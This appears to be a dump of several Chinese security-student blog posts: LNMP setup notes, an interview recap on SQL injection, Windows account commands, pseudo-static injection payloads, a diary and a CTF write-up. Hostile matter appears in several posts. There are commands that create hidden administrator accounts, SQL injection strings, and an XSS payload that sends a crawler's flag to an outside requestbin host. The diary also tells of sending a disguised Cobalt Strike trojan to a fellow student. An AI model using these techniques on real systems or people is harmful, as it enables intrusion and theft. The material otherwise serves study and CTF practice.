目录：/usr/local/proftpd/ Redis 目录：/usr/local/redis/\nLNMP相关配置文件位置 Nginx主配置(默认虚拟主机)文件：/usr/local/nginx/conf/nginx.conf 添加的虚拟主机配置文件：/usr/local/nginx/conf/vhost/域名.conf MySQL配置文件：/etc/my.cnf PHP配置文件：/usr/local/php/etc/php.ini php-fpm配置文件：/usr/local/php/etc/php-fpm.conf PureFtpd配置文件：/usr/local/pureftpd/pure-ftpd.conf 1.3及更高版本：/usr/local/pureftpd/etc/pure-ftpd.conf PureFtpd MySQL配置文件：/usr/local/pureftpd/pureftpd-mysql.conf Proftpd配置文件：/usr/local/proftpd/etc/proftpd.conf 1.2及之前版本为/usr/local/proftpd/proftpd.conf Proftpd 用户配置文件：/usr/local/proftpd/etc/vhost/用户名.conf Redis 配置文件：/usr/local/redis/etc/redis.conf\n如果之前已经有php-fpm,就\nkillall php-fpm lnmp restart 好啦!\n","date":"2022-04-14T20:24:35+08:00","permalink":"https://proben1.github.io/2022/lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%88%90%E5%8A%9F%E7%AF%87/","title":"LNMP环境搭建成功篇"},{"content":"教程:http://c.biancheng.net/linux_tutorial/16/\n任务:配置Linux服务器（lnmp或lamp环境）\nLAMP 环境搭建指的是在 Linux 操作系统中分别安装 Apache 网页服务器、MySQL 数据库服务器和 PHP 开发服务器，以及一些对应的扩展软件。\nLNMP 环境搭建指的是在 Linux 操作系统中分别安装 Nginx 网页服务器、MySQL 数据库服务器和 PHP 开发服务器，以及一些对应的扩展软件。\n打算安装LNMP的环境.\n系统:Centos-8\n手工安装LAMP需要19个源码包,安装LNMP 环境，那么同样需要安装大概 14 个源码包. 但是现在网上非常流行的 LNMP 环境的搭建过程是采用 LNMP 一键安装包直接安装。 既然是一键安装包，所以我们就不用去下载单个的源码包了，只要在 http://soft.vpser.net/lnmp/lnmp1.0-full.tar.gz 这个地址中下载 LNMP 一键安装包即可。\n我们应该把软件放置在 Linux 服务器的什么位置呢？ Linux 中的 /usr/local/src/ 目录是系统默认的放置下载软件源代码的位置 所以我们就把搭建 LNMP 环境所需的所有软件包都传递到这个位置\nWinSCP传输软件 WinSCP 是在 Windows 中安装，使用 SFTP 协议向 Linux 服务器传递文件的工具。它的特点是使用简单、图形化操作，而且数据传递过程是加密的，较为安全，是 Windows 和 Linux 之间进行数据传递的常用软件。\n在启动界面的“主机名”文本框中输入 Linux 服务器的 IP 地址，如 192.168.0.210，在“用户名”文本框中输入 Linux 的用户名，在“密码”文本框中输入正确的密码，单击“登录”按钮，就会见到如图 3 所示的界面。\nB计划:\ncd /usr/local/src/ wget http://soft.vpser.net/lnmp/lnmp1.0-full.tar.gz mv ~/lnmp1.0-full.tar.gz /usr/local/src/ yum换源 把原本的源移走备份\nmkdir /opt/centos-yum.bak mv /etc/yum.repos.d/* /opt/centos-yum.bak/ 查看系统版本\ncat /etc/redhat-release 下载aliyun yum源repo文件(对应CentOS-8)\nwget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo 清除缓存\nyum clean all yum makecache //把yum源缓存到本地，加快软件的搜索好安装速度 yum list 检查硬盘的剩余空间 df -h 注意挂载点\u0026quot;\u0026quot; 先留出4G的空间\n配置防火墙，开启80端口、3306端口(mysql)和11211（memcache）端口 systemctl start firewalld 开启防火墙 systemctl status firewalld 查看防火墙状态 firewall-cmd --list-all 查看开放端口 发现一个都没开hhh 下面来添加端口\n// Step1: 加入开放端口到配置文件 # firewall-cmd --zone=public --add-port=80/tcp --permanent --zone=public 添加时区 --add-port=80/tcp 添加端口 --permanent 永久生效 // 加载防火墙新配置文件( 以 root 身份输入以下命令，重新加载防火墙，并不中断用户连接，即不丢失状态信息. ) firewall-cmd --reload 记得重载后再查看开放的端口\n关闭SELinux安全子系统 我们还需要关闭 SELinux 安全子系统。因为这个子系统会对我们的安装过程产生影响，所以先关闭它。关闭 SELinux 之后，必须重启 Linux 系统，修改才会生效。\nvi /etc/selinux/config #把 SELINUX=enforcing改为 SELINUX=disabled shutdown -r now B计划:直接禁用防火墙 systemctl stop firewalld 关闭防火墙\n安装gcc 安装 gcc 编译工具。如果没有安装 gcc 编译工具，那么 LNMP 一键安装包会尝试自动 yum 安装，但是要保证 yum 源是可用的。\n停用 RPM 包安装的 apache 和 MySQL service httpd stop service mysqld stop #停止apache和mysql服务 chkconfig httpd off chkconfig mysqld off #关闭apache和mysql的自启动 解压 cd /usr/local/src/ tar -zxvf lnmp1.0-full.tar.gz 执行安装脚本安装 LNMP 一键安装包 cd lnmp1.0-full ./centos.sh 起飞! 回车之后安装就会继续，会看到如下界面：\n========================================================== LUMP V1.0 for CentOS/RadHat Linux VPS Written by Licess ========================================================== A tool to auto-compile \u0026amp; install Nginx+MySQL+PHP on Linux For more information please visit http://www.lnmp.org/ ========================================================== Please input the root password of mysql: (Default password: root) : 123 #设定MySQL 的密码，这里设为 123 ========================================================== Do you want to install the InnoDB Storage Engine? (Default no,if you want please input: y , if not please press the enter button):y #是否需要安装MySQL InnoDB，如果需要安装则输入y Install PHP 5.3.17,Please input y Install PHP 5.2.17,Please input n or press Enter (Please input y or n) :y #选择安装PHP的版本,输入y安装的是5.3.17 Install MySQL 5.5.27,Please input y Install MySQL 5.1.60,Please input n or press Enter (Please input y or n) :y #选择安装MySQL的版本，输入y安装的是5.5.27 Press any key to start. . .or Press Ctrl+c to cancel #按任意鍵开始安装 如果在安装过程中输入错误，则可以按“Ctrl+Backspace”组合键来进行删除。 如果看到以下界面，则证明安装成功。\n========================================================= Manager for LNMP VI.0 , Written by Licess ========================================================= LNMP is a tool to auto-compile \u0026amp; install Nginx+MySQL+PHP on Linux This script is a tool to Manage status of lnmp For more information please visit http://www.lnmp.org Usage: /root/lnmp {start|stop|reload|restart|kill|status} ========================================================= Nginx is runing! php-fpm is runing! MySQL running (12489) [确定] Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:53575 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN tcp 0 0 :::57454 :::* LISTEN tcp 0 0 :::111 :::* LISTEN tcp 0 0 :::22 :::* LISTEN tcp 0 0 ::1:631 :::* LISTEN tcp 0 0 ::1:25 :::* LISTEN LNMP一键安装包安装的软件及具体位置 既然是一键安装，那么默认安装的软件和软件的安装位置都是事先设定好的，在安装过程中不能更改。具体安装了哪些软件及其位置如表 1 所示。\n也就是说，LNMP 一键安装只安装了基本的 Nginx、MySQL、PHP、phpMyAdmin 和 Zend Optimizer。\n\u0026hellip;. ===================================== Check install =================================== Checking... Error: /usr/local/nginx not found!!!Nginx install failed. Error: /usr/local/php not found!!!PHP install failed. Error: /usr/local/mysql not found!!!MySQL install failed. Sorry,Failed to install LNMP! Please visit http://bbs.vpser.net/forum-25-1.html feedback errors and logs. You can download /root/lnmp-install.log from your server,and upload lnmp-install.log to LNMP Forum. [root@localhost-localdomain]在[/usr/local/src/lnmp1.0-full]笑着说: ​ 竟然失败了 重来 这次分来装 教程:https://blog.csdn.net/qq_24447851/article/details/106316944\n先是安装Nginx yum install -y nginx 安装nginx后可以访问服务器的ip进行查看 nginx\n创建用户组www\ngroupadd www useradd -g www www 在php-7.3.18里配置pm的用户组和用户\n./configure --prefix=/usr/local/php \\ --enable-fpm \\ --with-fpm-user=www \\ --with-fpm-group=www \\ --enable-mysqlnd \\ --with-mysqli=mysqlnd \\ --with-pdo-mysql=mysqlnd \\ --enable-mysqlnd-compression-support \\ --with-iconv-dir \\ --with-freetype-dir \\ --with-jpeg-dir \\ --with-png-dir \\ --with-zlib \\ --with-libxml-dir \\ --enable-xml \\ --disable-rpath \\ --enable-bcmath \\ --enable-shmop \\ --enable-sysvsem \\ --enable-inline-optimization \\ --with-curl \\ --enable-mbregex \\ --enable-mbstring \\ --enable-intl \\ --with-mcrypt \\ --with-libmbfl \\ --enable-ftp \\ --with-gd \\ --enable-gd-jis-conv \\ --enable-gd-native-ttf \\ --with-openssl \\ --with-mhash \\ --enable-pcntl \\ --enable-sockets \\ --with-xmlrpc \\ --enable-zip \\ --enable-soap \\ --with-gettext \\ --disable-fileinfo \\ --enable-opcache \\ --with-pear \\ --enable-maintainer-zts \\ --with-ldap=shared \\ --without-gdbm 嗯,过程中出现四五次报错,不过问题不大,直接百度就行 成功的话能看到这里\nGenerating files configure: creating ./config.status creating main/internal_functions.c creating main/internal_functions_cli.c +--------------------------------------------------------------------+ | License: | | This software is subject to the PHP License, available in this | | distribution in the file LICENSE. By continuing this installation | | process, you are bound by the terms of this license agreement. | | If you do not agree with the terms of this license, you must abort | | the installation process at this point. | +--------------------------------------------------------------------+ Thank you for using PHP. config.status: creating php7.spec config.status: creating main/build-defs.h config.status: creating scripts/phpize config.status: creating scripts/man1/phpize.1 config.status: creating scripts/php-config config.status: creating scripts/man1/php-config.1 config.status: creating sapi/cli/php.1 config.status: creating sapi/fpm/php-fpm.conf config.status: creating sapi/fpm/www.conf config.status: creating sapi/fpm/init.d.php-fpm config.status: creating sapi/fpm/php-fpm.service config.status: creating sapi/fpm/php-fpm.8 config.status: creating sapi/fpm/status.html config.status: creating sapi/phpdbg/phpdbg.1 config.status: creating sapi/cgi/php-cgi.1 config.status: creating ext/phar/phar.1 config.status: creating ext/phar/phar.phar.1 config.status: creating main/php_config.h config.status: executing default commands 接下来编译 make \u0026amp;\u0026amp; make install\ncp php.ini-development /usr/local/php/etc/php.ini cp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf cp /usr/local/php/etc/php-fpm.d/www.conf.default /usr/local/php/etc/php-fpm.d/www.conf vim /usr/local/php/etc/php-fpm.conf # 进入文件后找到下面的内容并更改目录 pid = /usr/local/php/var/run/php-fpm.pid vim /usr/lib/systemd/system/php-fpm.service #添加 [Unit] Description=The PHP FastCGI Process Manager After=syslog.target network.target [Service] Type=notify PIDFile=/var/opt/remi/php73/run/php-fpm/php-fpm.pid ExecStart=/opt/remi/php73/root/usr/sbin/php-fpm --nodaemonize --fpm-config /etc/opt/remi/php73/php-fpm.conf ExecReload=/bin/kill -USR2 $MAINPID PrivateTmp=true [Install] WantedBy=multi-user.target 注意: 需要根据自己环境情况 填写 PIDFile、ExecStart; PIDFile为pid文件, ExecStart 为可执行文件和 php-fpm.conf 配置文件地址\n加个权限：\nchmod +x /etc/init.d/php-fpm\n现在试一下，/etc/init.d/php-fpm start\nsystemctl重载 systemctl daemon-reload\n# 设置开机自启 systemctl enable php-fpm.server # 重启php-fpm systemctl restart php-fpm.server # 重启后可以查看php-fpm状态 systemctl status php-fpm.server 然后是安装mysql\n# 安装 yum install -y mariadb-server # 启动 systemctl start mariadb # 查看状态 systemctl status mariadb # 开机启动 systemctl enable mariadb # 设置密码 mysqladmin -uroot password \u0026#39;yourpassword\u0026#39; /usr/share/nginx/html /etc/nginx/nginx.conf\nhttps://lnmp.org/install.html\n","date":"2022-04-14T20:24:28+08:00","permalink":"https://proben1.github.io/2022/lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%B1%E8%B4%A5%E7%AF%87/","title":"LNMP环境搭建失败篇"},{"content":"hvv蓝队\n西邮的一个学长，很温柔\n先是看我加入了AD网络安全协会，他说自己是协会的创始人之一，我tm直接借机套一波近乎先，吹了下协会\n然后开始面试\n首先问了下《白帽子》，通过这本书我都了解些什么，我大概说了下安全世界观的事情，安全的本质是信任，扯了扯。第二个问sql注入的流程，分类，流程很简单，就是找个框就开注，遇到过滤fuzz一下，该绕过绕过；\n分类我分了三大类，差不多原话答\n1、按注入点数据类型分类：数字型、字符型 2、按数据传参方式分类：GET注入、POST注入、header头注入（cookie注入、host注入、user-agent注入、referer注入…） 3、按执行效果分类：union注入攻击、Boolean注入攻击-布尔盲注、报错注入攻击、时间注入攻击-时间盲注、堆叠查询注入攻击、二次注入攻击、宽字节注入攻击…\n接下来问了报错注入，我超我记不清，就记得e和u开头的俩函数，就实话实说了，但是等一会又想起来了，有一个updatexml，他问啥是xpath，我说是xml路径。最后他打了个圆场，可能我学太多忘了。\n补充一下\nfloor报错注入，利用数据库表主键不能重复的原理，使用GROUP BY分组，产生主键冗余，导致报错\nupdatexml()函数实际上是去更新了XML文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候它其实已经执行了那个子查询代码。\nextractvalue() :对XML文档进行查询的函数。 xml文档中查找字符位置是用/xxx/xxx/xxx/\u0026hellip;这种格式，如果写入其他格式就会报错,并且会返回写入的非法格式内容，错误信息如:XPATH syntax error:\u0026lsquo;xxxxxxxx\u0026rsquo;。\n注入接着问，盲注，怎么判断是不是盲注，我说了看回显可以类比成01的bool型还有无回显的时间盲注，接着又问了python脚本跑盲注，这个按自己情况说就可以了。\n接下来是文件上传，大体的上传思路（比如前端），还有对应的中间件解析漏洞，基本都在这两个博客里。 中间件解析漏洞https://www.cnblogs.com/1996-11-01-614lb/p/14237744.html 文件上传https://blog.csdn.net/ouyang_ly/article/details/120210422\n可能是按照我的简历问的，问了怎么加固系统，我说了下可以按照阿里云给的加固方案 https://www.alibabacloud.com/help/zh/doc-detail/49781.html，分成linux和windows，并强调了我在面试前特地准备了一下这个，还没说就问下一条了。\n最后是应急响应怎么做，我的思路是应急响应-\u0026gt;加固-\u0026gt;溯源，先找到具体的那一台机器，然后既然报警那就说明知道了具体的漏洞类型，加相应的补丁打上，以linux为主（一般都会问linux的），查看/var/log/secure系统日志，查看登录失败的记录，还有Linux历史命令\u0026ndash;\u0026gt;home目录的bash_histor，查看执行过的命令。再利用webshell或者是shell查杀工具查杀，查看tmp目录下是非有带有免杀的木马。拿到攻击ip之后开始溯源。 到这里就停了，溯源他没问，面试结束。\n最后问了下我的年级，大二，夸了下年轻有为，我说不算不算，年级里还有比我厉害的。\n我最后也问候了下学长的健康（本来昨天定的面试，结果人家去医院了）\n","date":"2022-04-10T09:13:17+08:00","permalink":"https://proben1.github.io/2022/%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E7%BB%8F%E5%8E%86/","title":"第一次面试经历"},{"content":"用户账户： 用户帐户是对计算机用户身份的标识。每个用户包含一个名称和一个密码\nSID：用户帐户拥有唯一的安全标识符\nSAM：本地安全帐户数据库，文件路径：C:\\Windows\\System32\\config\\SAM ，进程：lsass.exe\n本地用户和组：为用户和组分配权利和权限，从而限制用户和组执行某些操作的能力。\n一个用户可以在不同的组里，一个组也可以有不同的用户。\nwhoami /user 查看系统当前用户的SID wmic useraccount get name,sid 查看所有用户的SID 默认账户 **权限：**System \u0026gt; Administrator \u0026gt; User \u0026gt; Guest\n与windows组件关联的用户账户\nSystem (本地系统)：为windows的核心组件访问文件等资源提供权限； Local Service (本地服务)：预设的拥有最小权限的本地账户； Network Service (网络服务)：具有运行网络服务权限的计算机账户 查看、创建和删除账户 使用命令查看、创建和删除账户：\nnet user　查看系统账户 net user xie 123 /add 创建新用户xie，密码设置为 123 net user hack$ 123 /add 创建隐藏用户hack，密码为123 net user xie 查看账户xie的属性 net user xie x456. 将用户写的密码修改为x456. net user xie /del 删除用户xie net localgroup administrators xie /add 将普通用户xie提权到管理员 net localgroup administrators hack$ /add 将隐藏用户hack提权到管理员 用户组 Administrators Guests Power Users Users（标准用户） Remote Desktop Users administators 组内的用户，都具备系统管理员的权限，它们拥有对这台计算机最大的控制权限，可以执行整台计算机的管理任务。内置的系统管理员账号 Administrator 就是本地组的成员，而且无法将它从该组删除。如果这台计算机已加入域，则域的Domain Admins 会自动地加入到该计算机的Administrators组内。也就是说，域上的系统管理员在这台计算机上也具备着系统管理员的权限。\nGuests 组是提供给没有用户帐户但是需要访问本地计算机内资源的用户使用，该组的成员无法永久地改变其桌面的工作环境。该组最常见的默认成员为用户帐号Guest。\nPower Users 组内的用户具备比Users组更多的权利，但是比Administrators组拥有的权利更少一些，例如，可以：创建、删除、更改本地用户帐户；创建、删除、管理本地计算机内的共享文件夹与共享打印机；自定义系统设置，例如更改计算机时间、关闭计算机等。但是不可以更改Administrators，无法夺取文件的所有权、无法备份与还原文件、无法安装删除与删除设备驱动程序、无法管理安全与审核日志。\nUsers 组内的成员只拥有一些基本的权利，例如运行应用程序，但是他们不能修改操作系统的设置、不能更改其它用户的数据、不能关闭服务器级的计算机。所有添加的本地用户帐户者自动属于Users组。如果这台计算机已经加入域，则域的Domain Users会自动地被加入到该计算机的Users组中。\nRemote Desktop Users 组内的成员拥有远程桌面登录的权限。默认Administrators组内的成员都拥有远程桌面的权限。\n动态包含成员的内置组\n其成员由Windows程序“自动添加” ，Windows会根据用户的状态来决定用户所属的组 ，组内的成员也随之动态变化，无法修改。\n*Interactive：* 动态包含在本地登录的用户； *Authenticated Users*：任何一个利用有效的用户帐户连接的用户都属于这个组。建议在设置权限时，尽量针对Authenticated Users组进行设置，而不要针对Everone进行设置。 *Everyone* ：任何一个用户都属于这个组。注意，如果Guest帐号被启用时，则给Everone这个组指派权限时必须小心，因为当一个没有帐户的用户连接计算机时，他被允许自动利用Guest帐户连接，但是因为Guest也是属于Everone组，所以他将具备Everyone所拥有的权限。 组的查看、创建和删除 *使用命令查看、创建和删除组*\nnet localgroup 查看系统的组 net localgroup marketGroup /add 新建一个marketGroup的组 net localgroup marketGroup xie /add 将用户xie加入marketGroup组中 net localgroup markGroup 查看markGroup组内的成员 net localgroup marketGroup xie /del 将用户xi从marketGroup组中移除 net localgroup marketGroup /del 删除marketGroup组 net localgroup \u0026ldquo;remote desktop users\u0026rdquo; hack /add 将用户hack加入远程桌面组 net localgroup \u0026ldquo;remote desktop users\u0026rdquo; hack /del 将用户hack从远程桌面组删除 WDAGUtilityAccount帐户是Windows Defender Application Guard的一部分，它包含在RS3（aka windows 10 fall update）中。\nDefaultAccount用于开机自检阶段。\nBvSsh_VirtualUsers 是设置 BitWise（详见https://www.bitwise.nl/）虚拟用户时，创建的一个用户并将其用作写入文件的安全上下文。\n","date":"2022-04-10T09:10:24+08:00","permalink":"https://proben1.github.io/2022/windows%E6%9D%83%E9%99%90%E5%9F%BA%E7%A1%80/","title":"Windows权限基础"},{"content":"伪静态注入 伪静态网站 看似是静态网页（以.html、.htm等结尾），不存在任何的数据交互，却其实是动态网页，存在数据交互。 将动态网页的id等参数通过URL重写来隐藏，让查看者以为是静态网页。\n比如：\na/b/c?id=123 变成 a/b/c/id/123 检测方式 一般以图床，博客，论坛，这种文章类的网站居多\n可以在地址输入框里输入来得到网页最后的修改时间，如果得到的时间和现在时间一致，此页面就是伪静态，反之是真静态；因为动态页面的最后修改时间总是当前时间，而静态页面的最后修改时间则是它生成的时间。\njavascript:alert(document.lastModified)\n注入方式 a/b/c?id=123\u0026#39; and 1=1 --+ a/b/c/id/123\u0026#39;/**/and/**/1=1 a/b/c/id/123*.html （检测） ","date":"2022-03-26T18:01:28+08:00","permalink":"https://proben1.github.io/2022/%E4%BC%AA%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5/","title":"伪静态注入"},{"content":"2022-5-12 今天捣鼓了一天的博客，互联网是在是太精彩啦！\n在经过重重深思之后，我仍然无法决定观察日记是要写成这种小作文的形式还是写成每天流水账的形式，觉得，可以浅浅结合一下。\n快乐的月中总结，这里首先点名批评csgo，csgo做错了什么？在我疯狂的，放手一搏的，镇定自若的rushB，抢A大以及野牛干拉之后，我决定冷落这个csgo，恩，还有我帅气的AK火神。然后是身为罗德岛博士的反思，艾丽妮又做错了什么？连着投递五次入职书，她爱你啊！你却还执意偏爱鲨鲨，最终只是，徒劳的，200抽。\n从没发现自己这么会做ppt，情不自禁展示一下：\n最后竟然被打回了，改成了一个淡色的版本，这里又情不自禁展示一下：\n管理学签到，老师先发了个签到码，四位，我一猜是今天日期，直接一个0512上去，在路上就解决了签到问题，完美。遂逃课。然老师点名，寄，还说我咋签的这么快。\n2022-4-13 蛮快的，22年过三分之一了，看到四个月前的期末复习感觉自己像个傻子一样。拖，就硬拖，人现在还在等信号成绩。 在电脑上记的时候比较少，但是看起来存在感比较高，我以后可能会慢慢把手机上的转到电脑上。\n想想从疫情连夜逃回大连之后都发生了啥。\n1.吃火锅得到教训，不要把娃娃菜放到辣锅里去吃。\n2.查了四级成绩\u0026hellip;570，然后准备六级。\n3.一遍过了科二\u0026hellip;100，教练老开心了。刷完了科三学时，在路上跑现在应该没问题，下个假期驾照就差不多了。\n4.游戏方面。。。悟到了一个真理啊，游戏只是想要的生活中很容易得到的一部分。假期是经典的五黑和csgo无缝切换。星际拓荒很棒。\n5.拜年纪的《弈》，《再会江湖》，《流年如歌》，《另一个我》，《海盗船》。\n6.学会做饭，现在在疯狂点名家常菜。\n7.回了躺姥姥家，撸羊。\n开学，封校期间\n1.艾尔登法环。白金。神评了。\n2.hvv的面试，暂且称之为一面吧，但是我对今年能不能去hvv持担忧态度。\n3.做到了隐瞒一件事情，理性战胜了感性。\n4.看计网。。。\n期末考试开放期间\n1.看了《认知觉醒》。收获很大，特别是学会了冥想等。\n2..期末考试，先考了信号，然后清明假期啥都没干硬生生复习了三天，之后把模电，大物，概率论这些考了。重点来了，五科中的四科都感觉要挂，遂等成绩，然而成绩一直没出，直到今日，还差模电和信号。\n3.和科科去了翠华山，开局选了最难的一条道，爬完之后在风洞冰洞零下直接腿抽筋。不过风景还是很不错的。来回是黑车司机接送，可能是长安区最会说话的黑车司机了。。。什么两手抓两手都要硬，学习恋爱两不误，最后还把我微信推给同车姑娘的寝室群里去了hhh。\n4.为了复习类用coo写了个中国象棋，最后发现自己的归宿可能是去做万宁象棋的开发，后面想用pygame真的搞个万宁象棋hhhh。\n5.为了复现一些java的框架漏洞而开始学java 。\n6.和zc同学唠嗑，开始！\n不管咋说，最后又回到提升阶段了。假期的时候还是蛮丧的，现在真的看开了不少。\n2021的一些关键词（后半年才记的） 音乐《孤勇者》（12月）、《Abandon Ship》、明日方舟音律联觉（4月）、《呼吸之野》（5月）、《时光盲盒》（春节）\n电视剧《毛》（12月）、《双城之战》（11月）\n游戏《Borderlands3》（12月）、《钢铁雄心4》（12月）、《Subnautica》（10月）、《空洞骑士》（7月）、《晶体管》（6月）、星际争霸人族战役残酷（9月）、\n小说《死在火星上》（10月）\n2021-12-17 近期复习期末…………很麻\n期末期间学习任务安排：\n1.思想建设学习（贼上头）\n马克思主义，毛泽东思想\n2.英语学习（摸）\n英语书籍阅读\n3.计网\n4.渗透测试\n娱乐安排：从零到一的狼王成长之路（这里是后记，他还是不会狼人杀）、象棋、zuo球……还有什么铺地毯\n2021-12-08 睡觉前听模电课很明显比睡觉前刷手机cool，也更助眠……摸了一天模电……\n重保投了简历很明显人家没鸟我……\n昨天刷了某人的600个知乎回答，有了重塑三观的想法……这也侧面说明我的观念体系很脆弱（可能从小学修修补补用到现在？），这学期技术进步一般，总体来说但比上学期多；重点是其他的变化（才不是身子233），预计期末和假期会把精神世界重塑一遍（毛选，马原），就这样……\n来了俩新舍友，通工第一和第二……第一天就展示了“卷”字咋写，都上床了就你们还在学是吧？直接被阿杜骂到床上了（真·偷乐）。\n2021-12-05 记在了6号上面，因为是六号写的……\n在网协睡，没睡好，软协那边学弟定的5点闹钟，一直响到7点都没把他叫醒。吃个豆腐脑然后回宿舍，舍友没醒没人开门，在门外找了个CS免杀马的教程，照着试一下，结果真可以！第一位受害者遂成给我开门的舍友。\n中午睡了会，做了一个巨酷炫的梦。\n最好玩的地方来了。晚上，学弟在语雀里明确表示受到小风的欺压（X），于是小风向我要了免杀马并发给他。\n附：网易云破解版。\n人家还真就点开了，于是成功上线cs……把大一时写的鼠标抖动.exe传上去执行，顺便屏幕截图，发现学弟当时正在搜网易云破解版是啥hhh。我俩去124看情况，正好赶上鼠标开始鬼畜……一顿忙乎给清干净了。自己作（zuo，三声）的祸害得自己清理干净。\n晚上回宿舍朱朱将了一堆关于恋爱的感悟，emmm，可能吧，有些人看似没对象是在第一层，但实际上他也在第三层。没错，我现在已经在第三层了！\n2021-12-06 本来不想在中午记的，这东西还是晚上记合适。起因是学弟想看看博客，我寻思着就把豪哥的小作文推给他，结果没忍住自己看起来了，看着看着就如同身临其境，然后就emo了。\n之前一直是写的日记，嗯，纸质的那种，大一上写，大一下没写，这学期又捡起来了，再想自己的字可能文字识别也识别不出来，不如索性搁网上一弄，有些笑话大家都能看了，还能自己留个成长轨迹，以后想在现实里看大不了再打印嘛……\n上午溜了大物课，整理整理生活，还能剩下时间学模电，结果就一直在”喝茶——整理博客——上厕所——晒太阳“中无限循环，正好期末来了，难度“四级\u0026lt;=概率论\u0026lt;大物\u0026lt;信号\u0026lt;模电”，该收收心好好学学别挂科了，但是又想做题……只能妥协一下，每天就一道题吧，点到为止hhh。\n最近是没时间玩游戏了，亏我还买了大表哥，无主之地，蔚蓝，还给龙脉唱歌加了愿望单，幸运的话大四之前可以全玩完？呜呜呜！\n好好学习！打游戏可以再造个自己去玩？\n（昨天素材太好了，忍不住记一下，详见2021-12-05）\n","date":"2021-12-06T12:08:35+08:00","permalink":"https://proben1.github.io/2021/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%97demo/","title":"茄科生物观测日志(demo)"},{"content":"[Zer0pts2020]musicblog 有admin账户\n有下载\n有注册登录\n当然，最后点子在post音频里\n去想任意下载，不行。最后看wp，原来给源码，再做一遍。\n内容安全策略( CSP ) http://foreversong.cn/archives/760\nCSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性)。\nCSP的实质就是白名单策略，预先设定好哪些资源能被加载执行而哪些不能。\nflag在worker/worker.js\n// (snipped) const flag = \u0026#39;zer0pts{\u0026lt;censored\u0026gt;}\u0026#39;; // (snipped) const crawl = async (url) =\u0026gt; { console.log(`[+] Query! (${url})`); const page = await browser.newPage(); try { await page.setUserAgent(flag); await page.goto(url, { waitUntil: \u0026#39;networkidle0\u0026#39;, timeout: 10 * 1000, }); await page.click(\u0026#39;#like\u0026#39;); } catch (err){ console.log(err); } await page.close(); console.log(`[+] Done! (${url})`) }; // (snipped) “如果爬虫访问您拥有的网站，就可以从UA头里获得flag”\n这里的意思是会自动点击like，埋下伏笔\nutil.php 中\n// [[URL]] → \u0026lt;audio src=\u0026#34;URL\u0026#34;\u0026gt;\u0026lt;/audio\u0026gt; function render_tags($str) { $str = preg_replace(\u0026#39;/[[(.+?)]]/\u0026#39;, \u0026#39;\u0026lt;audio controls src=\u0026#34;\\1\u0026#34;\u0026gt;\u0026lt;/audio\u0026gt;\u0026#39;, $str); $str = strip_tags($str, \u0026#39;\u0026lt;audio\u0026gt;\u0026#39;); // only allows `\u0026lt;audio\u0026gt;` return $str; } audio为白标签\n而audio受以下CSP的限制，无法跨域请求：\n\u0026lt;?php error_reporting(0); require_once \u0026#39;config.php\u0026#39;; require_once \u0026#39;util.php\u0026#39;; $nonce = get_nonce(); header(\u0026#34;Content-Security-Policy: default-src \u0026#39;self\u0026#39;; object-src \u0026#39;none\u0026#39;; script-src \u0026#39;nonce-${nonce}\u0026#39; \u0026#39;strict-dynamic\u0026#39;; base-uri \u0026#39;none\u0026#39;; trusted-types\u0026#34;); header(\u0026#39;X-Frame-Options: DENY\u0026#39;); header(\u0026#39;X-XSS-Protection: 1; mode=block\u0026#39;); session_start(); 继续深入，strip_tags函数\n从Dockerfile中可以看出Web 服务器使用 PHP 7.4.0\nstrip_tags函数在7.4.0之前允许标签里出现斜线\n（应该是为了让\u0026lt;/audio\u0026gt;可以通过）\n但是\u0026lt;a/udio\u0026gt;在浏览器里会解析成\u0026lt;a\u0026gt;标签，而超链接的跳转不受CSP的限制。\n浏览器解析后就成了\n\u0026lt;a udio id=like href=http://http.requestbin.buuoj.cn/1illhcn1\u0026gt;aa 需要开个内网\nhttp://http.requestbin.buuoj.cn/1illhcn1 我们输入的内容是在第一个点赞按钮的上面，id为like，照应点击伏笔。\npayload\n\u0026lt;a/udio id=like href=http://http.requestbin.buuoj.cn/1illhcn1\u0026gt;aa 或 [[\u0026#34;\u0026gt;\u0026lt;/audio\u0026gt;\u0026lt;a/udio href=\u0026#34;http://http.requestbin.buuoj.cn/1illhcn1\u0026#34; id=\u0026#34;like\u0026#34;\u0026gt;test\u0026lt;/a/udio\u0026gt;\u0026lt;audio a=\u0026#34;]] 总结：\n刚做的时候四处找点，但是由于不知道这题有源码而gg 有源码之后开始暴躁审计，此时还没有体会到这题的巧妙之处。 最后写完wp的一瞬间，理清了全部思路，只能说，妙蛙！！！\n","date":"2021-12-05T16:37:25+08:00","permalink":"https://proben1.github.io/2021/zer0pts2020musicblog/","title":"[Zer0pts2020]musicblog"},{"content":"今天做题的时候，遇到了这个，一按F12，就弹出hacker\n以前还真没遇见过，搜了一下，原来是js\n\u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD XHTML 1.0 Transitional//EN\u0026#34; \u0026#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\u0026#34;\u0026gt; \u0026lt;html xmlns=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; 